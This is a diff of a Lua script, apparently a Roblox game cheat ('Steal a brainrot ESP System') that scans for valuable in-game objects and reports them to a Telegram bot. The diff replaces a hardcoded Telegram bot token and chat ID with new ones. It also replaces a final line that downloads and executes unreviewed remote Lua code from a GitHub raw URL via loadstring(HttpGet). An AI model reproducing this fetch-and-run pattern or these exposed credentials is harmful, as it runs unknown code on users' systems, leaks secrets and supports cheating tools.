@@ -31,8 +31,8 @@ local SCANNER_SETTINGS = {
 
 -- Настройки Telegram ботов
 local TG_MAIN = {
-    Token = "7624455250:AAHXqHESVLzkJi7w9Q5YXyGf394dIfrXy1M",
-    ChatId = "1072158346",
+    Token = "8216378798:AAGEMg0TE-Cc_cLsF2QWkm8vbcYWMNhfvJE",
+    ChatId = "5263524993",
     Enabled = true,
     ImportantObjects = {
         ["Secret Lucky Block"] = true,
@@ -766,4 +766,4 @@ print("Steal a brainrot ESP System активирован!")
 print("Отслеживается объектов: "..#OBJECT_NAMES)
 print("ID сервера:", getServerId())
 print("\nНажмите F для сканирования всех объектов")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/DEBIL59195/KLIMTYPOU/refs/heads/main/KLIM.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/piskastroi1-ui/SSik/refs/heads/main/ss2.lua"))()
